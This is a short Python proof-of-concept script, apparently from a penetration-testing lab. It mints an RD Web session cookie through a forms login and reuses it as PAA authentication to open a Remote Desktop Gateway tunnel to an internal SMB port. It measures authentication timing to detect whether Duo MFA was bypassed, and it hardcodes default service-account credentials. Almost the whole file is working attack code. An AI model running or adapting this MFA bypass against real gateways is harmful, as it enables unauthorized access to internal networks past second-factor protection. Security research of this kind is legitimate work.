#!/usr/bin/env python3
"""End-to-end probe: RD Web forms login (no Duo) -> PAA-cookie RDG tunnel.

Flow: mint TSWAAuthHttpOnlyCookie at login.aspx, then establish an RDG
tunnel with --ext-auth paa semantics (no NTLM anywhere). Any fast
TUNNEL_CREATE pass + fast TUNNEL_AUTH (<2s, timing oracle) means the
gateway accepted the RD Web session as the tunnel authentication — a
per-tunnel Duo bypass if it scales to enrolled accounts.
"""
import sys
import time

sys.path.insert(0, "/home/kali/workspace/RDetour")
from rdweb_probe import login
from rdetour import RDGTunnel

user = sys.argv[1] if len(sys.argv) > 1 else "svcaccount"
pw = sys.argv[2] if len(sys.argv) > 2 else "svcaccount"
target = sys.argv[3] if len(sys.argv) > 3 else "192.168.15.40:445"

s = login(user, pw)
c = [x for x in s.cookies if x.name == "TSWAAuthHttpOnlyCookie"]
if not c:
    sys.exit("[-] no TSWAAuthHttpOnlyCookie — login failed")
cookie = c[0].value
print("[*] cookie minted (%d chars), opening PAA tunnel..." % len(cookie))

t = RDGTunnel(gateway="ECORP-RDS.ecorp.local", domain="ECORP.local",
              user=user, password=pw, verbose=True,
              ext_auth="paa", paa_cookie=cookie)
t0 = time.time()
try:
    t.establish(auth_timeout=12)
    dt = time.time() - t0
    host, port = target.rsplit(":", 1)
    t.open_channel(host, int(port))
    print("[+] PAA TUNNEL AUTH OK in %.1fs — %s" %
          (dt, "NO PUSH (bypass!)" if dt < 2 else "slow — likely pushed"))
except Exception as e:
    print("[-] %s (after %.1fs)" % (e, time.time() - t0))
finally:
    t.close()
